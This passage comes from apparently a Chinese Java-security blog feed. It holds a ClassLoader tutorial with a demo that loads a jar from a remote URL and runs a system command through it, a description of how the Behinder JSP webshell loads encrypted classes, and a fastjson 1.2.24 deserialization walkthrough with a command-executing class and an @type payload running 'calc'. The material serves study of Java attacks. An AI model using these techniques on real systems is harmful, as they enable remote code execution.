class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestURLClassLoader</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment">// 定义远程加载的jar路径</span>            <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://anbai.io/tools/cmd.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 创建URLClassLoader对象，并加载远程jar包</span>            <span class="token class-name">URLClassLoader</span> ucl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>url<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 定义需要执行的系统命令</span>            <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"ls"</span><span class="token punctuation">;</span>            <span class="token comment">// 通过URLClassLoader加载远程jar包中的CMD类</span>            <span class="token class-name">Class</span> cmdClass <span class="token operator">=</span> ucl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"CMD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec("whoami");</span>            <span class="token class-name">Process</span> process <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Process</span><span class="token punctuation">)</span> cmdClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 获取命令执行结果的输入流</span>            <span class="token class-name">InputStream</span>           in   <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span>                b    <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span>                   a    <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token comment">// 读取命令执行结果</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment">// 输出命令执行结果</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>远程的<code>cmd.jar</code>中就一个<code>CMD.class</code>文件，对应的编译之前的代码片段如下：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CMD</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Process</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="类加载隔离"><a href="#类加载隔离" class="headerlink" title="类加载隔离"></a><strong>类加载隔离</strong></h2><p>创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。</p><p>也就是同级类加载器不能使用另外一个类加载器load的类。只能通过反射调用</p><p><strong>跨类加载</strong></p><p>  跨类加载器调用类方法时需要特别注意一个基本原则：<code>ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>anbai<span class="token punctuation">.</span>sec<span class="token punctuation">.</span>classloader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">com<span class="token punctuation">.</span>anbai<span class="token punctuation">.</span>sec<span class="token punctuation">.</span>classloader<span class="token punctuation">.</span></span><span class="token class-name">TestClassLoader</span><span class="token punctuation">.</span><span class="token static">TEST_CLASS_BYTES</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">com<span class="token punctuation">.</span>anbai<span class="token punctuation">.</span>sec<span class="token punctuation">.</span>classloader<span class="token punctuation">.</span></span><span class="token class-name">TestClassLoader</span><span class="token punctuation">.</span><span class="token static">TEST_CLASS_NAME</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestCrossClassLoader</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderA</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">{</span>       <span class="token keyword">public</span> <span class="token class-name">ClassLoaderA</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">{</span>            <span class="token comment">// 加载类字节码</span>            <span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token constant">TEST_CLASS_NAME</span><span class="token punctuation">,</span> <span class="token constant">TEST_CLASS_BYTES</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">TEST_CLASS_BYTES</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderB</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token class-name">ClassLoaderB</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">{</span>            <span class="token comment">// 加载类字节码</span>            <span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token constant">TEST_CLASS_NAME</span><span class="token punctuation">,</span> <span class="token constant">TEST_CLASS_BYTES</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">TEST_CLASS_BYTES</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token comment">// 父类加载器</span>        <span class="token class-name">ClassLoader</span> parentClassLoader <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// A类加载器</span>        <span class="token class-name">ClassLoaderA</span> aClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassLoaderA</span><span class="token punctuation">(</span>parentClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// B类加载器</span>        <span class="token class-name">ClassLoaderB</span> bClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassLoaderB</span><span class="token punctuation">(</span>parentClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 使用A/B类加载器加载同一个类</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> aClass  <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token constant">TEST_CLASS_NAME</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> aClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> aaClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token constant">TEST_CLASS_NAME</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> aClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> bClass  <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token constant">TEST_CLASS_NAME</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> bClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 比较A类加载和B类加载器加载的类是否相等</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"aClass == aaClass："</span> <span class="token operator">+</span> <span class="token punctuation">(</span>aClass <span class="token operator">==</span> aaClass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"aClass == bClass："</span> <span class="token operator">+</span> <span class="token punctuation">(</span>aClass <span class="token operator">==</span> bClass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> aClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"方法清单："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取该类所有方法</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method <span class="token operator">:</span> methods<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// 创建类实例</span>        <span class="token class-name">Object</span> instanceA <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取hello方法</span>        <span class="token class-name">Method</span> helloMethod <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 调用hello方法</span>        <span class="token class-name">String</span> result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> helloMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>instanceA<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n反射调用："</span> <span class="token operator">+</span> <span class="token constant">TEST_CLASS_NAME</span> <span class="token operator">+</span> <span class="token string">"类"</span> <span class="token operator">+</span> helloMethod<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"方法，返回结果："</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>输出结果</p><pre class="language-text" data-language="text"><code class="language-text">aClass == aaClass：true        aClass == bClass：false        com.anbai.sec.classloader.TestHelloWorld方法清单：public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()        反射调用：com.anbai.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~</code></pre><h2 id="JSP自定义类加载类型的后门"><a href="#JSP自定义类加载类型的后门" class="headerlink" title="JSP自定义类加载类型的后门"></a><strong>JSP自定义类加载类型的后门</strong></h2><p>  以<code>冰蝎</code>为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的<code>equals</code>方法实现恶意攻击，其中<code>equals</code>方法传入的<code>pageContext</code>对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。</p><h2 id="BCEL字节码加载"><a href="#BCEL字节码加载" class="headerlink" title="BCEL字节码加载"></a><strong>BCEL字节码加载</strong></h2><p>未完待续….</p><p>参考：<a href="https://javasec.org/javase/ClassLoader/">https://javasec.org/javase/ClassLoader/</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson反序列化解析过程调试</title>
      <link href="/2023/12/05/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95/"/>
      <url>/2023/12/05/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson反序列化解析过程调试"><a href="#fastjson反序列化解析过程调试" class="headerlink" title="fastjson反序列化解析过程调试"></a>fastjson反序列化解析过程调试</h1><p>简单水一下fastjson反序列化解析过程的调试</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>​    fastjson是阿里巴巴开源的java中解析json的一个组件。其功能就是将json字符串与java对象进行相互转化。正如其名，解析j转化速度很快</p><p>​     但fastjson多个版本都爆出反序列化漏洞，因此当遇到json时，可以看是否用了fastjson，再测是否存在漏洞</p><p>​当json中含有@type字段时，fastjson会将json解析为对应类的对象</p><p>​本篇文章主要是fastjson在反序列化解析的调试</p><h2 id="调式的代码"><a href="#调式的代码" class="headerlink" title="调式的代码"></a>调式的代码</h2><p><strong>环境</strong>：</p><ul><li>jdk8</li><li>fastjson 1.2.24</li></ul><p>导入（pom.xml）</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><p>自定义的恶意类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>enity</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span> mymap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了静态代码块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCmd</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了set方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了get方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"get"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Map</span> <span class="token function">getMymap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> mymap<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>​      这里并不是标准的JavaBean,没有cmd属性，但有setCmd方法</p><p>调试代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s<span class="token operator">=</span><span class="token string">"{\"@type\":\"org.example.enity.Test\",\"cmd\":\"calc\"}"</span><span class="token punctuation">;</span><span class="token class-name">JSONObject</span> student<span class="token operator">=</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="JSON-parseObject方法"><a href="#JSON-parseObject方法" class="headerlink" title="JSON.parseObject方法"></a>JSON.<em>parseObject方法</em></h2><p>   这次是以<em>parseObject的过程。parse方法稍微有些不同</em> </p><p>具体代码</p><img src="/img/12-4/2.png"><ol><li><h4 id="初步解析"><a href="#初步解析" class="headerlink" title="初步解析"></a>初步解析</h4></li></ol><p> 可以看出，第一步就是反序列化得到一个obj对象，后面会将该对象转为JSON对象</p><p>那么整个反序列化和解析逻辑都在这个parse方法中</p><ol start="2"><li><h4 id="进入parse方法"><a href="#进入parse方法" class="headerlink" title="进入parse方法:"></a>进入parse方法:</h4></li></ol><p>具体解析的函数是在JSON类中的parse方法</p><img src="/img/12-4/1.png"><p>前面的就是简单解析进行初始化，将json字符串封装到parser对象中</p><ol start="3"><li><h4 id="进入JSON类中的parse方法："><a href="#进入JSON类中的parse方法：" class="headerlink" title="进入JSON类中的parse方法："></a>进入JSON类中的parse方法：</h4></li></ol><p>前面几层套娃(…)，到这里开始解析左边界，</p><img src="/img/12-4/3.png"><p>当解析到{时,会返回一个对象</p><ol start="4"><li><h4 id="然后继续进入parseObject方法："><a href="#然后继续进入parseObject方法：" class="headerlink" title="然后继续进入parseObject方法："></a>然后继续进入parseObject方法：</h4></li></ol><p>首先会进行类加载</p><img src="/img/12-4/4.png"><pre><code>   类加载的时候，会判断是否是一些特殊的类，然后在从从默认加载的类中寻找，如果没有才会用类加载器加载，如下</code></pre><img src="/img/12-4/5.png"><img src="/img/12-4/6.png"><p>那么我们给出的类就已经加载到内存了</p><p>后面的步骤就是获取反序列化器，和进行反序列化了</p><img src="/img/12-4/7.png"><ol start="5"><li><h4 id="进入ParserConfig类中的getDeserializer方法："><a href="#进入ParserConfig类中的getDeserializer方法：" class="headerlink" title="进入ParserConfig类中的getDeserializer方法："></a>进入ParserConfig类中的getDeserializer方法：</h4></li></ol><p>首先查询是否为已经加载的反序列化器和默认类反序列化器</p><img src="/img/12-4/8.png"><img src="/img/12-4/9.png"><p>最后创建一个反序列化器，并将其放入derializers中，表示已经加载的反序列化器</p><img src="/img/12-4/10.png"><ol start="6"><li><h4 id="进入createJavaBeanDeserializer方法："><a href="#进入createJavaBeanDeserializer方法：" class="headerlink" title="进入createJavaBeanDeserializer方法："></a>进入createJavaBeanDeserializer方法：</h4></li></ol><p>在里面会创建一个JavaBeanInfo对象</p><h3 id="获取getter和setter"><a href="#获取getter和setter" class="headerlink" title="获取getter和setter"></a>获取getter和setter</h3><p>其实这一个函数才是本次调试的核心方法</p><img src="/img/12-4/11.png"><p>跟进build方法，首先可以看到使用反射获取我们给的类的方法属性和方法</p><img src="/img/12-4/12.png"><ul><li>获取所有setXXX(标准javaBean中存在的方法)</li></ul><p>​         遍历方法数组，选取出符合条件的方法</p><p>下图为部分代码截图</p><img src="/img/12-4/13.png"><p>筛选条件：</p><ul><li>方法名长度&gt;=4</li><li>不能是静态方法</li><li>不能是无参函数，且必须有返回</li><li>参数个数为1</li><li>方法名必须以set开头</li><li>不能有注解</li></ul><p>​        根据这些条件能够选出setXXX，不一定是javaBean中的setXXX，只要满足条件就行（比如我定义的恶意类setCmd函数）</p><p>​    根据这点，后面的fastjson反序列漏洞寻找能利用的方法。</p><p>然后根据方法推断出属性名</p><p>​    类似的获取getXXX</p><img src="/img/12-4/14.png"><p>筛选条件</p><ul><li>非静态方法</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><p>如果按照普通的类（没有像调式代码的类一样）就会进入下面方法 </p><p><em>最后根据前面获取的东西，构造JavaBeanInfo对象（会把一些构造器啥的丢进去）</em></p><img src="/img/12-4/15.png"><p>​        <em>然后会根据JavaBeanInfo对象构造反序列化器</em></p><p><em>进入ASMDeserializerFactory类中的createJavaBeanDeserializer：</em></p><p>​        这就是最后构造反序列化器的函数(晕*</p><img src="/img/12-4/16.png"><p><em>这里开始会进行初始化操作，对象类名设置为fastjson自定义的类名</em></p><p><em>然后反射newInstance构造一个实例返回</em></p><p><em>至此原来的createJavaBeanDeserializer函数结束。</em></p><p>整个获取反序列器的步骤结束</p><ol start="7"><li><h4 id="利用反序列化器进行反序列化"><a href="#利用反序列化器进行反序列化" class="headerlink" title="利用反序列化器进行反序列化"></a>利用反序列化器进行反序列化</h4></li></ol><img src="/img/12-4/17.png"><p>​        发现后面代码调试不了，这是因为前面<em>ASMDeserializerFactory</em>  是用利用ASM重新生成类(ASM操作字节码),因为这个反序列化器类是代码生成的，在内存中，所以无法使用idea调试后面的反序列化操作 </p><img src="/img/12-4/18.png"><h3 id="解决不能调试"><a href="#解决不能调试" class="headerlink" title="解决不能调试"></a>解决不能调试</h3><p>查看在最后之前的代码</p><img src="/img/12-4/20.png"><p>​          起初asmEnable为 true,会走下面代码（也就是前面不能调式的代码）。如果asmEnable是false,就会直接创建一个JavaBean反序列化器（就不需要使用ASM创建一个临时的类了）。这样，后面代码可以继续调试。 </p><p>这里有几种方式 </p><img src="/img/12-4/21.png"><p>​         发现getOnly为true更适合（其他的是要求 ： 类是非public、要是一个接口、属性个数大于200）</p><p>查找getOnly，发现只有一处为false</p><p>是一个Feildinfo的构造方法</p><img src="/img/12-4/22.png"><p>  这里看出方法的参数个数不能为1</p><p>发现只有在前面JaavaBean.build的时候</p><p>  遍历获取getter方法的时候，才满足条件</p><img src="/img/12-4/23.png"><p>进入if后，会调用这个new FeildInfo时进入上面的设置getOnly为true </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token function">add</span><span class="token punctuation">(</span>fieldList<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">FieldInfo</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">,</span> method<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> clazz<span class="token punctuation">,</span> type<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> annotation<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里进入if就行了</p><p>​      这里是要方法的返回值是这些类中的其中一个，只有前面两个好实现,collection类和map类</p><p>​     除此之外，也不能有之对应的setxxx，如果存在，就不会在getxxx(第二次循环时候)被解析</p><p><strong>综上</strong>：</p><p>​         类中需要一个返回类型是map类型getxxx方法（且不能有对应的setxxx），才能对后续代码进行调试</p><p>因此调试代码中有mymap属性和getMymap方法</p><p><strong>然后继续</strong></p><p>进入默认的反序列化器JavaBeanDeserializer中进行反序列化，其中下面代码会触发setXXX方法</p><img src="/img/12-4/24.png"><p>后面也没什么了，出反序列化方法</p><p>如果是parseObject方法。 最后会进行json对象的序列化</p><img src="/img/12-4/25.png"><p>   然后使用JavaBeanSerializer序列化成json对象</p><p>在其中，会调用所有属性的getter方法</p><img src="/img/12-4/26.png"><p>这里是使用反射调用的getter方法 </p><img src="/img/12-4/27.png"><h2 id="总结"><a href="#总结" class="headerlink" 